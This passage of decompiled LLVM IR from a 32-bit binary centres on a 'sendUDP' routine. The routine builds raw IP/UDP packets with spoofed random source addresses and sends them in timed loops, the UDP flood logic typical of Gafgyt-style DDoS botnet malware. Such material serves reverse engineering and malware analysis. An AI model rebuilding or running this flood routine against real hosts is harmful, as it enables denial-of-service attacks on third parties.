dec_label_pc_804b324:                             ; preds = %dec_label_pc_804b237, %dec_label_pc_804b31a
  %v4_804b324 = add nuw nsw i32 %storemerge39, 1
  store i32 %v4_804b324, i32* @eax, align 4
  %exitcond = icmp eq i32 %v4_804b324, %arg6
  br i1 %exitcond, label %dec_label_pc_804b333, label %dec_label_pc_804b237

dec_label_pc_804b333:                             ; preds = %dec_label_pc_804b324, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg6, %dec_label_pc_804b324 ]
  store i32 %v0_804b200, i32* @edi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v2_804b267, { 1, 0, 2 }
  uselistorder i32 %v5_804b21e, { 1, 0 }
  uselistorder label %dec_label_pc_804b324, { 1, 0 }
  uselistorder label %dec_label_pc_804b285, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_5()
  %tmp40 = call i16 @__decompiler_undefined_function_5()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %v0_804b33c = load i32, i32* @ebx, align 4
  %v12_804b33d = ptrtoint i32* %stack_var_-124 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804b346 = icmp eq i32 %arg2, 0
  %v1_804b34a = icmp eq i1 %v4_804b346, false
  br i1 %v1_804b34a, label %dec_label_pc_804b357, label %dec_label_pc_804b34c

dec_label_pc_804b34c:                             ; preds = %entry
  %v1_804b34c = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804b36f

dec_label_pc_804b357:                             ; preds = %entry
  %v1_804b35a = urem i32 %arg2, 65536
  store i32 %v1_804b35a, i32* %eax.global-to-local, align 4
  %v1_804b363 = call i32 @htons(i32 %v1_804b35a)
  br label %dec_label_pc_804b36f

dec_label_pc_804b36f:                             ; preds = %dec_label_pc_804b34c, %dec_label_pc_804b357
  %v2_804b372 = ptrtoint i32* %stack_var_-68 to i32
  %v15_804b375 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v15_804b375, i32* %eax.global-to-local, align 4
  %v3_804b37c = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v3_804b37c, i32* %eax.global-to-local, align 4
  %v1_804b384 = icmp eq i32 %v3_804b37c, 0
  %v1_804b386 = icmp eq i1 %v1_804b384, false
  br i1 %v1_804b386, label %dec_label_pc_804b7df, label %dec_label_pc_804b38c

dec_label_pc_804b38c:                             ; preds = %dec_label_pc_804b36f
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804b3a5 = icmp eq i32 %arg4, 32
  %v1_804b3a9 = icmp eq i1 %v9_804b3a5, false
  br i1 %v1_804b3a9, label %dec_label_pc_804b4ca, label %dec_label_pc_804b3af

dec_label_pc_804b3af:                             ; preds = %dec_label_pc_804b38c
  %v3_804b3b8 = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_804b3b8, i32* %eax.global-to-local, align 4
  %v4_804b3c3 = icmp eq i32 %v3_804b3b8, 0
  br i1 %v4_804b3c3, label %dec_label_pc_804b7df, label %dec_label_pc_804b3cd

dec_label_pc_804b3cd:                             ; preds = %dec_label_pc_804b3af
  %v1_804b3d0 = add i32 %arg5, 1
  store i32 %v1_804b3d0, i32* %eax.global-to-local, align 4
  %v1_804b3d5 = call i32 @malloc(i32 %v1_804b3d0)
  store i32 %v1_804b3d5, i32* %eax.global-to-local, align 4
  %v4_804b3e0 = icmp eq i32 %v1_804b3d5, 0
  br i1 %v4_804b3e0, label %dec_label_pc_804b7df, label %dec_label_pc_804b3ea

dec_label_pc_804b3ea:                             ; preds = %dec_label_pc_804b3cd
  store i32 %v1_804b3d0, i32* %edx.global-to-local, align 4
  %v1_804b3f3 = inttoptr i32 %v1_804b3d5 to i8*
  store i32 %v1_804b3d5, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804b3f8 = and i32 %v1_804b3d5, -256
  store i32 %v1_804b3f8, i32* %eax.global-to-local, align 4
  %v5_804b3fa = call i8* @_memset(i8* %v1_804b3f3, i32 %v1_804b3f8, i32 %v1_804b3d0)
  %v3_804b402 = call i32 @makeRandomStr(i8* %v1_804b3f3, i32 %arg5)
  store i32 %v3_804b402, i32* %eax.global-to-local, align 4
  %v2_804b40f = call i32 @__GI_time(i32* null)
  %v5_804b417 = add i32 %v2_804b40f, %arg3
  store i32 %v5_804b417, i32* %eax.global-to-local, align 4
  %v1_804b49e = mul i32 %tmp50, 100
  %v2_804b4a7 = mul i32 %tmp50, 1000
  %v1_804b4ae = sext i32 %v2_804b4a7 to i64
  br label %dec_label_pc_804b42d.outer

dec_label_pc_804b42d.outer:                       ; preds = %dec_label_pc_804b48b, %dec_label_pc_804b4c2, %dec_label_pc_804b3ea
  %stack_var_-88.0.ph = phi i32 [ 0, %dec_label_pc_804b3ea ], [ 0, %dec_label_pc_804b48b ], [ %v4_804b4c2, %dec_label_pc_804b4c2 ]
  %stack_var_-92.0.ph = phi i32 [ 0, %dec_label_pc_804b3ea ], [ %v4_804b480, %dec_label_pc_804b48b ], [ %v4_804b480, %dec_label_pc_804b4c2 ]
  br label %dec_label_pc_804b42d

dec_label_pc_804b42d:                             ; preds = %dec_label_pc_804b42d.outer, %dec_label_pc_804b461
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_804b461 ], [ %stack_var_-92.0.ph, %dec_label_pc_804b42d.outer ]
  store i32 %v2_804b372, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v3_804b3b8, i32* %stack_var_-156, align 4
  %v6_804b442 = call i32 @__libc_sendto(i32 %v3_804b3b8, i32 %v1_804b3d5, i32 %arg5, i32 0, i32 %v2_804b372, i32 16)
  store i32 %v6_804b442, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804b44d = icmp eq i32 %stack_var_-92.0, %arg6
  %v1_804b450 = icmp eq i1 %v15_804b44d, false
  br i1 %v1_804b450, label %dec_label_pc_804b480, label %dec_label_pc_804b452

dec_label_pc_804b452:                             ; preds = %dec_label_pc_804b42d
  br i1 %v1_804b34a, label %dec_label_pc_804b461, label %dec_label_pc_804b458

dec_label_pc_804b458:                             ; preds = %dec_label_pc_804b452
  %v0_804b458 = load i32, i32* %stack_var_-156, align 4
  %v1_804b458 = call i32 @rand_cmwc(i32 %v0_804b458)
  store i32 %v1_804b458, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b461

dec_label_pc_804b461:                             ; preds = %dec_label_pc_804b452, %dec_label_pc_804b458
  %v2_804b466 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b466, i32* %eax.global-to-local, align 4
  %v8_804b471 = icmp sgt i32 %v2_804b466, %v5_804b417
  br i1 %v8_804b471, label %dec_label_pc_804b7df, label %dec_label_pc_804b42d

dec_label_pc_804b480:                             ; preds = %dec_label_pc_804b42d
  %v4_804b480 = add i32 %stack_var_-92.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804b486 = icmp eq i32 %stack_var_-88.0.ph, %arg7
  %v1_804b489 = icmp eq i1 %v15_804b486, false
  br i1 %v1_804b489, label %dec_label_pc_804b4c2, label %dec_label_pc_804b48b

dec_label_pc_804b48b:                             ; preds = %dec_label_pc_804b480
  store i32 %v1_804b49e, i32* %edx.global-to-local, align 4
  store i32 %v2_804b4a7, i32* %eax.global-to-local, align 4
  %v2_804b4ae = call i32 @usleep(i64 %v1_804b4ae)
  store i32 %v2_804b4ae, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42d.outer

dec_label_pc_804b4c2:                             ; preds = %dec_label_pc_804b480
  %v4_804b4c2 = add i32 %stack_var_-88.0.ph, 1
  br label %dec_label_pc_804b42d.outer

dec_label_pc_804b4ca:                             ; preds = %dec_label_pc_804b38c
  store i32 %v12_804b33d, i32* %eax.global-to-local, align 4
  %v3_804b4d8 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_804b4d8, i32* %eax.global-to-local, align 4
  %v4_804b4e3 = icmp eq i32 %v3_804b4d8, 0
  %v1_804b4e7 = icmp eq i1 %v4_804b4e3, false
  br i1 %v1_804b4e7, label %dec_label_pc_804b4ee, label %dec_label_pc_804b7dc

dec_label_pc_804b4ee:                             ; preds = %dec_label_pc_804b4ca
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804b4fa = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804b4fa, i32* %eax.global-to-local, align 4
  store i32 %v3_804b4d8, i32* %stack_var_-156, align 4
  %v5_804b505 = call i32 @__GI_setsockopt(i32 %v3_804b4d8, i32 0, i32 3, i32 %v2_804b4fa, i32 4)
  store i32 %v5_804b505, i32* %eax.global-to-local, align 4
  %v2_804b50d = icmp slt i32 %v5_804b505, 0
  %v1_804b50f = icmp eq i1 %v2_804b50d, false
  br i1 %v1_804b50f, label %dec_label_pc_804b54f.preheader, label %dec_label_pc_804b7dc

dec_label_pc_804b54f.preheader:                   ; preds = %dec_label_pc_804b4ee
  br label %dec_label_pc_804b51f

dec_label_pc_804b51f:                             ; preds = %dec_label_pc_804b54f.preheader, %dec_label_pc_804b51f
  %stack_var_-32.087 = phi i32 [ 50, %dec_label_pc_804b54f.preheader ], [ %v4_804b54f, %dec_label_pc_804b51f ]
  %v4_804b54f = add nsw i32 %stack_var_-32.087, -1
  %v2_804b524 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b524, i32* %eax.global-to-local, align 4
  store i32 %v2_804b524, i32* @ebx, align 4
  %v1_804b52e = call i32 @rand_cmwc(i32 0)
  %v1_804b533 = load i32, i32* @ebx, align 4
  %v2_804b533 = xor i32 %v1_804b533, %v1_804b52e
  store i32 %v2_804b533, i32* @eax, align 4
  %v1_804b539 = call i32 @srand(i32 %v2_804b533)
  store i32 %v1_804b539, i32* @eax, align 4
  %v0_804b541 = call i32 @random()
  store i32 %v0_804b541, i32* %eax.global-to-local, align 4
  %v1_804b547 = call i32 @init_rand(i32 %v0_804b541)
  store i32 %v1_804b547, i32* %eax.global-to-local, align 4
  %v13_804b552 = icmp eq i32 %v4_804b54f, 0
  %v1_804b556 = icmp eq i1 %v13_804b552, false
  br i1 %v1_804b556, label %dec_label_pc_804b51f, label %dec_label_pc_804b558

dec_label_pc_804b558:                             ; preds = %dec_label_pc_804b51f
  %v4_804b558 = icmp eq i32 %arg4, 0
  %v1_804b55c = icmp eq i1 %v4_804b558, false
  br i1 %v1_804b55c, label %dec_label_pc_804b567, label %dec_label_pc_804b57d

dec_label_pc_804b567:                             ; preds = %dec_label_pc_804b558
  %v5_804b56e = sub i32 32, %arg4
  %v2_804b576 = urem i32 %v5_804b56e, 32
  %v4_804b576 = icmp eq i32 %v2_804b576, 0
  br i1 %v4_804b576, label %bb83, label %bb

bb:                                               ; preds = %dec_label_pc_804b567
  %v5_804b576 = shl i32 1, %v2_804b576
  br label %bb83

bb83:                                             ; preds = %dec_label_pc_804b567, %bb
  %v0_804b578 = phi i32 [ %v5_804b576, %bb ], [ 1, %dec_label_pc_804b567 ]
  %v1_804b578 = sub i32 0, %v0_804b578
  store i32 %v1_804b578, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b57d

dec_label_pc_804b57d:                             ; preds = %dec_label_pc_804b558, %bb83
  %storemerge5 = phi i32 [ %v1_804b578, %bb83 ], [ 0, %dec_label_pc_804b558 ]
  %v1_804b580 = add i32 %arg5, 28
  %v1_804b58c = add i32 %arg5, 58
  %v2_804b58f = and i32 %v1_804b58c, -16
  %v2_804b595 = sub i32 %v12_804b33d, %v2_804b58f
  %v1_804b59d = add i32 %v2_804b595, 15
  %v2_804b5a0 = and i32 %v1_804b59d, -16
  %v1_804b5b8 = add i32 %v2_804b5a0, 20
  %v5_804b5bb = inttoptr i32 %v1_804b5b8 to i16*
  %v1_804b5c1 = add i32 %arg5, 8
  store i32 %v1_804b5c1, i32* %eax.global-to-local, align 4
  store i32 %v1_804b5c1, i32* @ebx, align 4
  %v5_804b5c9 = add i32 %v2_804b595, -16
  %v6_804b5c9 = inttoptr i32 %v5_804b5c9 to i32*
  store i32 %storemerge5, i32* %v6_804b5c9, align 4
  %v2_804b5cc = call i32 @GetRandomIP(i32 %v1_804b580, i32 %v2_804b5a0)
  store i32 %v2_804b5cc, i32* %eax.global-to-local, align 4
  %v0_804b5d1 = load i32, i32* @esp, align 4
  %v3_804b5d7 = inttoptr i32 %v0_804b5d1 to i32*
  store i32 %v2_804b5cc, i32* %v3_804b5d7, align 4
  %v0_804b5d8 = call i32 @htonl()
  store i32 %v0_804b5d8, i32* %eax.global-to-local, align 4
  %v0_804b5dd = load i32, i32* @esp, align 4
  %v3_804b5e0 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804b5e0, i32* %edx.global-to-local, align 4
  %v0_804b5e6 = load i32, i32* @ebx, align 4
  %v2_804b5e6 = add i32 %v0_804b5dd, 8
  %v3_804b5e6 = inttoptr i32 %v2_804b5e6 to i32*
  store i32 %v0_804b5e6, i32* %v3_804b5e6, align 4
  %v1_804b5e7 = add i32 %v0_804b5dd, 4
  %v2_804b5e7 = inttoptr i32 %v1_804b5e7 to i32*
  store i32 17, i32* %v2_804b5e7, align 4
  %v3_804b5e9 = inttoptr i32 %v0_804b5dd to i32*
  store i32 %v0_804b5d8, i32* %v3_804b5e9, align 4
  %v0_804b5ea = load i32, i32* %edx.global-to-local, align 4
  %v2_804b5ea = add i32 %v0_804b5dd, -4
  %v3_804b5ea = inttoptr i32 %v2_804b5ea to i32*
  store i32 %v0_804b5ea, i32* %v3_804b5ea, align 4
  %v5_804b5eb = add i32 %v0_804b5dd, -8
  %v6_804b5eb = inttoptr i32 %v5_804b5eb to i32*
  store i32 %v2_804b5a0, i32* %v6_804b5eb, align 4
  %v0_804b5ee = call i32 @makeIPPacket()
  %v0_804b5f3 = load i32, i32* @esp, align 4
  %v1_804b5fc = urem i32 %v1_804b5c1, 65536
  store i32 %v1_804b5fc, i32* %eax.global-to-local, align 4
  %v2_804b604 = add i32 %v0_804b5f3, 8
  %v3_804b604 = inttoptr i32 %v2_804b604 to i32*
  store i32 %v1_804b5fc, i32* %v3_804b604, align 4
  %v2_804b605 = call i32 @htons(i32 %v1_804b5b8)
  %v3_804b605 = trunc i32 %v2_804b605 to i16
  %sext6 = mul i32 %v2_804b605, 65536
  %v1_804b60d = sdiv i32 %sext6, 65536
  store i32 %v1_804b60d, i32* %edx.global-to-local, align 4
  store i32 %v1_804b5b8, i32* %eax.global-to-local, align 4
  %v3_804b612 = add i32 %v2_804b5a0, 24
  %v4_804b612 = inttoptr i32 %v3_804b612 to i16*
  store i16 %v3_804b605, i16* %v4_804b612, align 8
  %v2_804b616 = call i32 @rand_cmwc(i32 %v1_804b5b8)
  %sext = mul i32 %v2_804b616, 65536
  %v1_804b61b = sdiv i32 %sext, 65536
  store i32 %v1_804b61b, i32* %edx.global-to-local, align 4
  store i32 %v1_804b5b8, i32* %eax.global-to-local, align 4
  %v1_804b620 = trunc i32 %v1_804b61b to i16
  store i16 %v1_804b620, i16* %v5_804b5bb, align 4
  br i1 %v1_804b34a, label %dec_label_pc_804b634, label %dec_label_pc_804b629

dec_label_pc_804b629:                             ; preds = %dec_label_pc_804b57d
  %v2_804b629 = call i32 @rand_cmwc(i32 %v1_804b5b8)
  store i32 %v2_804b629, i32* %eax.global-to-local, align 4
  %.pre36 = urem i32 %arg2, 65536
  br label %dec_label_pc_804b64c

dec_label_pc_804b634:                             ; preds = %dec_label_pc_804b57d
  %v1_804b637 = urem i32 %arg2, 65536
  store i32 %v1_804b637, i32* %eax.global-to-local, align 4
  %v0_804b63c = load i32, i32* @esp, align 4
  %v2_804b63f = add i32 %v0_804b63c, -16
  %v3_804b63f = inttoptr i32 %v2_804b63f to i32*
  store i32 %v1_804b637, i32* %v3_804b63f, align 4
  %v1_804b640 = sext i16 %tmp40 to i32
  %v2_804b640 = call i32 @htons(i32 %v1_804b640)
  store i32 %v2_804b640, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b64c

dec_label_pc_804b64c:                             ; preds = %dec_label_pc_804b629, %dec_label_pc_804b634
  %v1_804b6f7.pre-phi = phi i32 [ %.pre36, %dec_label_pc_804b629 ], [ %v1_804b637, %dec_label_pc_804b634 ]
  %storemerge4.in = phi i32 [ %v2_804b629, %dec_label_pc_804b629 ], [ %v2_804b640, %dec_label_pc_804b634 ]
  %storemerge4 = trunc i32 %storemerge4.in to i16
  %sext7 = mul i32 %storemerge4.in, 65536
  %v4_804b64f = sdiv i32 %sext7, 65536
  store i32 %v4_804b64f, i32* %edx.global-to-local, align 4
  %v3_804b652 = add i32 %v2_804b5a0, 22
  %v4_804b652 = inttoptr i32 %v3_804b652 to i16*
  store i16 %storemerge4, i16* %v4_804b652, align 2
  %v1_804b659 = add i32 %v2_804b5a0, 26
  %v2_804b659 = inttoptr i32 %v1_804b659 to i16*
  store i16 0, i16* %v2_804b659, align 2
  %v1_804b662 = add i32 %v2_804b5a0, 28
  store i32 %v1_804b662, i32* %eax.global-to-local, align 4
  %v4_804b665 = load i32, i32* @esp, align 4
  %v5_804b665 = add i32 %v4_804b665, -4
  %v6_804b665 = inttoptr i32 %v5_804b665 to i32*
  store i32 %arg5, i32* %v6_804b665, align 4
  %v0_804b668 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b668 = add i32 %v4_804b665, -8
  %v3_804b668 = inttoptr i32 %v2_804b668 to i32*
  store i32 %v0_804b668, i32* %v3_804b668, align 4
  %v3_804b669 = inttoptr i32 %v4_804b64f to i8*
  %v4_804b669 = call i32 @makeRandomStr(i8* %v3_804b669, i32 %v12_804b33d)
  %v0_804b66e = load i32, i32* @esp, align 4
  store i32 %v2_804b5a0, i32* %eax.global-to-local, align 4
  %v1_804b674 = or i32 %v2_804b5a0, 2
  %v2_804b674 = inttoptr i32 %v1_804b674 to i16*
  %v3_804b674 = load i16, i16* %v2_804b674, align 2
  %v4_804b674 = zext i16 %v3_804b674 to i32
  store i32 %v4_804b674, i32* %edx.global-to-local, align 4
  store i32 %v2_804b5a0, i32* %eax.global-to-local, align 4
  %v2_804b683 = add i32 %v0_804b66e, 4
  %v3_804b683 = inttoptr i32 %v2_804b683 to i32*
  store i32 %v4_804b674, i32* %v3_804b683, align 4
  %v0_804b684 = load i32, i32* %eax.global-to-local, align 4
  %v3_804b684 = inttoptr i32 %v0_804b66e to i32*
  store i32 %v0_804b684, i32* %v3_804b684, align 4
  %v3_804b685 = inttoptr i32 %v4_804b64f to i16*
  %v4_804b685 = call i32 @csum(i16* %v3_804b685, i32 %v12_804b33d)
  %v5_804b685 = trunc i32 %v4_804b685 to i16
  %sext10 = mul i32 %v4_804b685, 65536
  %v1_804b68d = sdiv i32 %sext10, 65536
  store i32 %v1_804b68d, i32* %edx.global-to-local, align 4
  store i32 %v2_804b5a0, i32* %eax.global-to-local, align 4
  %v3_804b692 = or i32 %v2_804b5a0, 10
  %v4_804b692 = inttoptr i32 %v3_804b692 to i16*
  store i16 %v5_804b685, i16* %v4_804b692, align 2
  %v0_804b696 = load i32, i32* @esp, align 4
  %v1_804b699 = add i32 %v0_804b696, -16
  %v2_804b699 = inttoptr i32 %v1_804b699 to i32*
  store i32 0, i32* %v2_804b699, align 4
  %v2_804b69b = inttoptr i32 %v4_804b64f to i32*
  %v3_804b69b = call i32 @__GI_time(i32* %v2_804b69b)
  %v0_804b6a0 = load i32, i32* @esp, align 4
  %v1_804b6a0 = add i32 %v0_804b6a0, 16
  %v5_804b6a3 = add i32 %v3_804b69b, %arg3
  store i32 %v5_804b6a3, i32* %eax.global-to-local, align 4
  %v3_804b721 = or i32 %v2_804b5a0, 4
  %v4_804b721 = inttoptr i32 %v3_804b721 to i16*
  %v2_804b744 = or i32 %v2_804b5a0, 12
  %v3_804b744 = inttoptr i32 %v2_804b744 to i32*
  %v1_804b7b0 = mul i32 %tmp50, 100
  %v2_804b7b9 = mul i32 %tmp50, 1000
  br label %dec_label_pc_804b6b9.outer

dec_label_pc_804b6b9.outer:                       ; preds = %dec_label_pc_804b79d, %dec_label_pc_804b7d4, %dec_label_pc_804b64c
  %v0_804b6bf.pre = phi i32 [ %v1_804b6a0, %dec_label_pc_804b64c ], [ %v1_804b7c5, %dec_label_pc_804b79d ], [ %v0_804b6bf.pre.pre.pre, %dec_label_pc_804b7d4 ]
  %stack_var_-84.0.ph = phi i32 [ 0, %dec_label_pc_804b64c ], [ %v4_804b792, %dec_label_pc_804b79d ], [ %v4_804b792, %dec_label_pc_804b7d4 ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804b64c ], [ 0, %dec_label_pc_804b79d ], [ %v4_804b7d4, %dec_label_pc_804b7d4 ]
  %stack_var_-102.0.ph = phi i16 [ %tmp, %dec_label_pc_804b64c ], [ %storemerge, %dec_label_pc_804b79d ], [ %storemerge, %dec_label_pc_804b7d4 ]
  br label %dec_label_pc_804b6b9

dec_label_pc_804b6b9:                             ; preds = %dec_label_pc_804b6b9.outer, %dec_label_pc_804b774
  %v0_804b6bf = phi i32 [ %v1_804b77e, %dec_label_pc_804b774 ], [ %v0_804b6bf.pre, %dec_label_pc_804b6b9.outer ]
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804b774 ], [ %stack_var_-84.0.ph, %dec_label_pc_804b6b9.outer ]
  %stack_var_-102.0 = phi i16 [ %storemerge, %dec_label_pc_804b774 ], [ %stack_var_-102.0.ph, %dec_label_pc_804b6b9.outer ]
  store i32 %v2_804b372, i32* %eax.global-to-local, align 4
  store i32 %v2_804b5a0, i32* %edx.global-to-local, align 4
  %v1_804b6c2 = add i32 %v0_804b6bf, -12
  %v2_804b6c2 = inttoptr i32 %v1_804b6c2 to i32*
  store i32 16, i32* %v2_804b6c2, align 4
  %v2_804b6c4 = add i32 %v0_804b6bf, -16
  %v3_804b6c4 = inttoptr i32 %v2_804b6c4 to i32*
  store i32 %v2_804b372, i32* %v3_804b6c4, align 4
  %v1_804b6c5 = add i32 %v0_804b6bf, -20
  %v2_804b6c5 = inttoptr i32 %v1_804b6c5 to i32*
  store i32 0, i32* %v2_804b6c5, align 4
  %v5_804b6c7 = add i32 %v0_804b6bf, -24
  %v6_804b6c7 = inttoptr i32 %v5_804b6c7 to i32*
  store i32 %v1_804b580, i32* %v6_804b6c7, align 4
  %v0_804b6ca = load i32, i32* %edx.global-to-local, align 4
  %v2_804b6ca = add i32 %v0_804b6bf, -28
  %v3_804b6ca = inttoptr i32 %v2_804b6ca to i32*
  store i32 %v0_804b6ca, i32* %v3_804b6ca, align 4
  %v5_804b6cb = add i32 %v0_804b6bf, -32
  %v6_804b6cb = inttoptr i32 %v5_804b6cb to i32*
  store i32 %v3_804b4d8, i32* %v6_804b6cb, align 4
  %v6_804b6ce = call i32 @__libc_sendto(i32 %stack_var_-80.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804b6ce, i32* %eax.global-to-local, align 4
  %v1_804b6d6 = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  %sext2 = mul i32 %v1_804b6d6, 65536
  %v1_804b6db = sdiv i32 %sext2, 65536
  store i32 %v1_804b6db, i32* %edx.global-to-local, align 4
  store i32 %v1_804b5b8, i32* %eax.global-to-local, align 4
  %v1_804b6e0 = trunc i32 %v1_804b6db to i16
  store i16 %v1_804b6e0, i16* %v5_804b5bb, align 4
  br i1 %v1_804b34a, label %dec_label_pc_804b6f4, label %dec_label_pc_804b6e9

dec_label_pc_804b6e9:                             ; preds = %dec_label_pc_804b6b9
  %v1_804b6e9 = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  br label %dec_label_pc_804b70c

dec_label_pc_804b6f4:                             ; preds = %dec_label_pc_804b6b9
  store i32 %v1_804b6f7.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804b6fc = load i32, i32* @esp, align 4
  %v2_804b6ff = add i32 %v0_804b6fc, -16
  %v3_804b6ff = inttoptr i32 %v2_804b6ff to i32*
  store i32 %v1_804b6f7.pre-phi, i32* %v3_804b6ff, align 4
  %v1_804b700 = sext i16 %stack_var_-102.0 to i32
  %v2_804b700 = call i32 @htons(i32 %v1_804b700)
  br label %dec_label_pc_804b70c

dec_label_pc_804b70c:                             ; preds = %dec_label_pc_804b6e9, %dec_label_pc_804b6f4
  %storemerge.in = phi i32 [ %v1_804b6e9, %dec_label_pc_804b6e9 ], [ %v2_804b700, %dec_label_pc_804b6f4 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804b5b8, i32* %eax.global-to-local, align 4
  %v4_804b70f = urem i32 %storemerge.in, 65536
  %v5_804b70f = load i32, i32* %edx.global-to-local, align 4
  %v6_804b70f = and i32 %v5_804b70f, -65536
  %v7_804b70f = or i32 %v6_804b70f, %v4_804b70f
  store i32 %v7_804b70f, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804b652, align 2
  %sext12 = mul i32 %storemerge.in, 65536
  %v1_804b717 = sdiv i32 %sext12, 65536
  %v2_804b717 = call i32 @rand_cmwc(i32 %v1_804b717)
  %sext3 = mul i32 %v2_804b717, 65536
  %v1_804b71c = sdiv i32 %sext3, 65536
  store i32 %v1_804b71c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b5a0, i32* %eax.global-to-local, align 4
  %v1_804b721 = trunc i32 %v1_804b71c to i16
  store i16 %v1_804b721, i16* %v4_804b721, align 4
  %v0_804b725 = load i32, i32* @esp, align 4
  %v5_804b728 = add i32 %v0_804b725, -16
  %v6_804b728 = inttoptr i32 %v5_804b728 to i32*
  store i32 %storemerge5, i32* %v6_804b728, align 4
  %v3_804b72b = call i32 @GetRandomIP(i32 %v1_804b717, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804b72b, i32* %eax.global-to-local, align 4
  %v0_804b730 = load i32, i32* @esp, align 4
  %v3_804b736 = inttoptr i32 %v0_804b730 to i32*
  store i32 %v3_804b72b, i32* %v3_804b736, align 4
  %v0_804b737 = call i32 @htonl()
  store i32 %v0_804b737, i32* %edx.global-to-local, align 4
  store i32 %v0_804b737, i32* %v3_804b744, align 4
  store i32 %v2_804b5a0, i32* %eax.global-to-local, align 4
  %v3_804b74a = load i16, i16* %v2_804b674, align 2
  %v4_804b74a = zext i16 %v3_804b74a to i32
  store i32 %v4_804b74a, i32* %edx.global-to-local, align 4
  store i32 %v2_804b5a0, i32* %eax.global-to-local, align 4
  %v1_804b759 = load i32, i32* @esp, align 4
  %v2_804b759 = add i32 %v1_804b759, -4
  %v3_804b759 = inttoptr i32 %v2_804b759 to i32*
  store i32 %v4_804b74a, i32* %v3_804b759, align 4
  %v0_804b75a = load i32, i32* %eax.global-to-local, align 4
  %v2_804b75a = add i32 %v1_804b759, -8
  %v3_804b75a = inttoptr i32 %v2_804b75a to i32*
  store i32 %v0_804b75a, i32* %v3_804b75a, align 4
  %v3_804b75b = inttoptr i32 %v1_804b717 to i16*
  %v4_804b75b = call i32 @csum(i16* %v3_804b75b, i32 ptrtoint (i32* @0 to i32))
  %v5_804b75b = trunc i32 %v4_804b75b to i16
  %sext15 = mul i32 %v4_804b75b, 65536
  %v1_804b763 = sdiv i32 %sext15, 65536
  store i32 %v1_804b763, i32* %edx.global-to-local, align 4
  store i16 %v5_804b75b, i16* %v4_804b692, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804b76f = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804b772 = icmp eq i1 %v15_804b76f, false
  br i1 %v1_804b772, label %dec_label_pc_804b792, label %dec_label_pc_804b774

dec_label_pc_804b774:                             ; preds = %dec_label_pc_804b70c
  %v0_804b774 = load i32, i32* @esp, align 4
  %v1_804b777 = add i32 %v0_804b774, -16
  %v2_804b777 = inttoptr i32 %v1_804b777 to i32*
  store i32 0, i32* %v2_804b777, align 4
  %v2_804b779 = inttoptr i32 %v1_804b717 to i32*
  %v3_804b779 = call i32 @__GI_time(i32* %v2_804b779)
  store i32 %v3_804b779, i32* %eax.global-to-local, align 4
  %v0_804b77e = load i32, i32* @esp, align 4
  %v1_804b77e = add i32 %v0_804b77e, 16
  %v8_804b784 = icmp sgt i32 %v3_804b779, %v5_804b6a3
  br i1 %v8_804b784, label %dec_label_pc_804b7dc, label %dec_label_pc_804b6b9

dec_label_pc_804b792:                             ; preds = %dec_label_pc_804b70c
  %v4_804b792 = add i32 %stack_var_-84.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804b798 = icmp eq i32 %stack_var_-80.0.ph, %arg7
  %v1_804b79b = icmp eq i1 %v15_804b798, false
  br i1 %v1_804b79b, label %dec_label_pc_804b7d4, label %dec_label_pc_804b79d

dec_label_pc_804b79d:                             ; preds = %dec_label_pc_804b792
  store i32 %v1_804b7b0, i32* %edx.global-to-local, align 4
  store i32 %v2_804b7b9, i32* %eax.global-to-local, align 4
  %v0_804b7bc = load i32, i32* @esp, align 4
  %v2_804b7bf = add i32 %v0_804b7bc, -16
  %v3_804b7bf = inttoptr i32 %v2_804b7bf to i32*
  store i32 %v2_804b7b9, i32* %v3_804b7bf, align 4
